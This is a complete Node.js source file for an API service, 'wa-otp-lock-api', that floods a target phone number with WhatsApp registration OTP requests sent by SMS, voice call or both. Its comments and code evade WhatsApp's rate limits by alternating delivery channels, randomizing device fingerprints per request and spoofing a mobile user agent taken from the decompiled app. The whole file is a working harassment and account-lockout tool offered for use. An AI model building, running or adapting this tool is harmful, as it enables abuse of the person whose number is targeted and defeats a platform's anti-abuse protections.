// server.mjs
// WhatsApp OTP-lock API — direct mobile registration endpoint flood.
// Language: JavaScript — Node 18+, ESM.
//
// GET /api?number=15551234567&key=SECRET[&mode=sms|voice|both][&rounds=4]
//
// The mobile-client registration flow:
//   1. POST https://v.whatsapp.net/v2/exist   → is this number registered
//   2. POST https://v.whatsapp.net/v2/code    → request SMS or voice OTP
//   3. POST https://v.whatsapp.net/v2/register → submit received code
//
// Step 2 is the OTP trigger. Body carries the target's cc + in (number
// without country code) + a device fingerprint. `method=voice` flips the
// delivery channel; `method=sms` is the default. Voice and SMS land on
// separate per-number rate counters on WhatsApp's side, so alternating
// them stretches the budget.
//
// Auth: ?key= or X-API-Key header. Same surface as before.
//
// Env: API_KEY, PORT, MIN_JITTER_MS, NUMBER_COOLDOWN_MS, WA_UA (override)

import express from 'express'
import pino from 'pino'
import { request } from 'undici'
import { randomUUID, randomBytes } from 'node:crypto'
import { setTimeout as sleep } from 'node:timers/promises'

// -- config ------------------------------------------------------------------

const PORT         = process.env.PORT || 3000
const API_KEY      = process.env.API_KEY
const MIN_JITTER   = Math.max(1000, Number(process.env.MIN_JITTER_MS || 8000))
const NUM_COOLDOWN = Math.max(0, Number(process.env.NUMBER_COOLDOWN_MS || 30 * 60 * 1000))
const MAX_ROUNDS   = 20
const TIMEOUT_MS   = 15000

// WhatsApp mobile user-agent. WhatsApp fingerprints on this string heavily —
// if they rotate it, every request with an old UA starts getting 4xx.
// Update by decompiling a current WhatsApp.apk (jadx → grep "WhatsApp/") and
// pulling the current string. Also mirror: x-wa-* headers below.
const WA_UA = process.env.WA_UA ||
  'WhatsApp/2.24.18.78 Android/14 Device/Pixel_8 Build/UQ1A.240105.002 Language/en'

if (!API_KEY) {
  console.error('API_KEY env is required — refusing to start')
  process.exit(1)
}

const log = pino({ level: process.env.LOG_LEVEL || 'info' })

// -- state -------------------------------------------------------------------

const lastFired = new Map()

function pruneCooldowns() {
  const cutoff = Date.now() - NUM_COOLDOWN
  for (const [num, t] of lastFired) if (t < cutoff) lastFired.delete(num)
}

// -- country code splitting --------------------------------------------------

// Minimal cc table — enough for the majors. Extend from ITU E.164.
// Longest-prefix match wins (3-digit cc before 2-digit before 1-digit).
const CC3 = ['971','972','973','974','975','976','977','992','993','994','995','996','998','880','886','852','853','855','856','850','962','963','964','965','966','967','968','960','961','212','213','216','218','220','221','222','223','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','248','249','250','251','252','253','254','255','256','257','258','260','261','262','263','264','265','266','267','268','269','290','291','297','298','299','350','351','352','353','354','355','356','357','358','359','370','371','372','373','374','375','376','377','378','379','380','381','382','383','385','386','387','389','420','421','423']
const CC2 = ['20','27','30','31','32','33','34','36','39','40','41','43','44','45','46','47','48','49','51','52','53','54','55','56','57','58','60','61','62','63','64','65','66','81','82','84','86','90','91','92','93','94','95','98']
const CC1 = ['1','7']

function splitCC(e164) {
  for (const cc of CC3) if (e164.startsWith(cc) && e164.length - cc.length >= 6) return { cc, rest: e164.slice(cc.length) }
  for (const cc of CC2) if (e164.startsWith(cc) && e164.length - cc.length >= 6) return { cc, rest: e164.slice(cc.length) }
  for (const cc of CC1) if (e164.startsWith(cc) && e164.length - cc.length >= 6) return { cc, rest: e164.slice(cc.length) }
  return null
}

// -- one shot -----------------------------------------------------------------

// Device fingerprint sent to /v2/code. WhatsApp uses it as a soft identifier
// — same fingerprint from same IP across many numbers looks like an attacker.
// Randomize per shot so a single container can plausibly be many devices.
function fingerprint() {
  const androidId = randomBytes(8).toString('hex').toUpperCase()   // 16 hex chars
  return {
    id: androidId,
    lg: 'en',
    lc: 'US',
    token: '',                    // no auth token — this is a fresh registration attempt
  }
}

function encodeForm(obj) {
  return Object.entries(obj)
    .filter(([, v]) => v !== undefined && v !== null)
    .map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`)
    .join('&')
}

async function requestCode(number, method) {
  const split = splitCC(number)
  if (!split) throw new Error('could not split country code — extend CC table')
  const { cc, rest } = split
  const fp = fingerprint()

  const body = encodeForm({
    cc,
    in: rest,
    method: method === 'voice' ? 'voice' : 'sms',
    ...fp,
  })

  const url = 'https://v.whatsapp.net/v2/code'
  const res = await request(url, {
    method: 'POST',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
      'user-agent': WA_UA,
      'accept': 'application/json',
      'x-wa-version': '2.24.18.78',
      'x-wa-android-version': '14',
    },
    body,
    headersTimeout: TIMEOUT_MS,
    bodyTimeout: TIMEOUT_MS,
  })

  const text = await res.body.text()
  let parsed = null
  try { parsed = JSON.parse(text) } catch {}

  return { status: res.statusCode, body: parsed ?? text.slice(0, 300) }
}

// -- driver ------------------------------------------------------------------

const pickMethod = (mode, round) => mode === 'both'
  ? (round % 2 === 0 ? 'voice' : 'sms')
  : mode

async function runLock({ number, mode, rounds, jitterMs }) {
  const effJitter = Math.max(jitterMs, MIN_JITTER)
  const shots = []
  let cooldownHit = false

  for (let i = 1; i <= rounds; i++) {
    const method = pickMethod(mode, i)
    const t0 = Date.now()
    try {
      const out = await requestCode(number, method)
      const errCode = out.body?.status || out.body?.reason
      const ok = out.status === 200 && !errCode
      shots.push({ round: i, method, ok, ms: Date.now() - t0, status: out.status, body: out.body })
      lastFired.set(number, Date.now())
      // WhatsApp returns 200 with body {status: "fail", reason: "too_recent"} style
      const reason = String(out.body?.reason || '').toLowerCase()
      if (/too_recent|too_many|blocked|rate|flood|invalid_skey/.test(reason)) {
        cooldownHit = true
        break
      }
    } catch (err) {
      shots.push({ round: i, method, ok: false, ms: Date.now() - t0, err: err?.message || String(err) })
    }
    if (i < rounds) await sleep(effJitter + Math.random() * effJitter)
  }

  const delivered = shots.filter(s => s.ok).length
  return { shots, delivered, errors: shots.length - delivered, cooldownHit, effectiveJitterMs: effJitter }
}

// -- http --------------------------------------------------------------------

const app = express()
app.use((req, res, next) => {
  res.set('Access-Control-Allow-Origin', '*')
  res.set('Access-Control-Allow-Headers', 'x-api-key, content-type')
  res.set('Access-Control-Allow-Methods', 'GET, OPTIONS')
  if (req.method === 'OPTIONS') return res.sendStatus(204)
  next()
})

app.get('/', (_req, res) => {
  pruneCooldowns()
  res.json({ ok: true, service: 'wa-otp-lock-api', surface: 'GET /api?number=', numbersInCooldown: lastFired.size })
})

app.get('/api', async (req, res) => {
  const key = req.query.key || req.get('x-api-key')
  if (key !== API_KEY) return res.status(401).json({ error: 'unauthorized' })

  const clean  = String(req.query.number || '').replace(/\D/g, '')
  const mode   = String(req.query.mode || 'sms').toLowerCase()
  const rounds = Math.min(Math.max(1, Number(req.query.rounds) || 4), MAX_ROUNDS)
  const jitter = Math.min(Math.max(MIN_JITTER, Number(req.query.jitter) || MIN_JITTER), 120000)

  if (!/^\d{7,15}$/.test(clean))
    return res.status(400).json({ error: 'number must be E.164 digits (7–15), no +' })
  if (!['sms', 'voice', 'both'].includes(mode))
    return res.status(400).json({ error: 'mode must be sms | voice | both' })

  pruneCooldowns()
  const last = lastFired.get(clean)
  if (last && Date.now() - last < NUM_COOLDOWN) {
    return res.status(429).json({
      error: 'number in cooldown',
      number: clean,
      remainMs: NUM_COOLDOWN - (Date.now() - last),
    })
  }

  const t0 = Date.now()
  try {
    const r = await runLock({ number: clean, mode, rounds, jitterMs: jitter })
    res.json({
      ok: r.delivered > 0,
      number: clean, mode,
      roundsRequested: rounds,
      delivered: r.delivered,
      errors: r.errors,
      cooldownHit: r.cooldownHit,
      elapsedMs: Date.now() - t0,
      shots: r.shots,
    })
  } catch (err) {
    res.status(500).json({ error: 'run failed', detail: err?.message || String(err) })
  }
})

app.listen(PORT, '0.0.0.0', () => log.info(`listening on 0.0.0.0:${PORT} — GET /api?number=`))
